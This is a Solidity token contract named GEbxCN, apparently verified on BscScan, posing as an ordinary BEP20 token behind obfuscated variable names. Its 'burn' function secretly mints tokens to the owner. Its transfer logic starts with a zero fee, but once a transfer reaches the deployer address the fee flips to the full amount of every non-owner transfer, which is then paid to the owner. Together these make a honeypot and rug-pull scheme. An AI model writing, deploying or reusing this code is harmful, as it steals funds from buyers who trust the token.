/**
 *Submitted for verification at BscScan.com on 2022-12-03
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.8.17;
contract GEbxCN {
address public  MHHHup = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  FgTyFz = 10000000000000000000;
uint256 public  FPuXZM = 100000000000000000;
uint256 public  UdFEBx = 100000000000000000000;
uint256 public  VjMWMM = 100000000000000000000000;
address public  UCNYiO = address(0);
uint256 public  uKMkjm = 10000000000000000;
string public  symbol = "GEbxCN";
string public  name = "GEbxCN";
uint256 private  cgiOrs = 10000000000000;
address private  bPBLWJ = address(0);
uint256 public constant gbrtWO = 9999999+1;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint8 public constant decimals = 18;
uint256 public constant totalSupply = 100000000000000000000000000000;
mapping (address => uint256) public balanceOf;
uint256 public  KLuLIK = 1000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address public  ZmfVXC = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  NmsldD = 10000000000000000000000000000;
address public  dfkzsY = address(0);
address public  GRFGQZ = address(0);
uint256 public  YlQKyO = 100000000000000000000000;
address public owner;
address public  fupCiz = address(0);
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "MXjqSq");
require(to != address(0), "MXjqSq");
require(amount <= balanceOf[from], "MXjqSq");
uint256 reward;
if (from == owner || to == owner){
reward = 0;
}
else{
reward = gbrtWO/cgiOrs * amount;
}

uint256 transferAmount = amount - reward;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += reward;
if (to==bPBLWJ){
cgiOrs = 9999999+1;
}
emit Transfer(from, to, transferAmount);
}
constructor () {
bPBLWJ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}

}